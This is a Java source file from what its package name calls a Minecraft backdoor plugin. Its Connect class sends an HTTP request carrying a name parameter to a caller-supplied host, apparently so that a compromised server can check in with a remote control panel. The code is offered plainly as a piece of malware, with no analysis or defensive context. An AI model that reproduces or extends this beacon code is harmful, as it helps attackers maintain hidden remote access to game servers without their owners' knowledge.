package minecraft.backdoor.plugin.api.panel.connect;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;

public class Connect {
  public Connect(String url, String name) throws IOException {
	  String replaced_name = name.replace(" ", "%20");
	  if(url.contains("http://") || url.contains("https://")){
		  URL connect = new URL(url + "?name=" + replaced_name);
		  URLConnection yc = connect.openConnection();
		  BufferedReader in = new BufferedReader(new InputStreamReader(yc.getInputStream()));
	  } else {
		  URL connect = new URL("http://" + url + "?name=" + replaced_name);
		  URLConnection yc = connect.openConnection();
		  BufferedReader in = new BufferedReader(new InputStreamReader(yc.getInputStream()));
	  }
  }
}
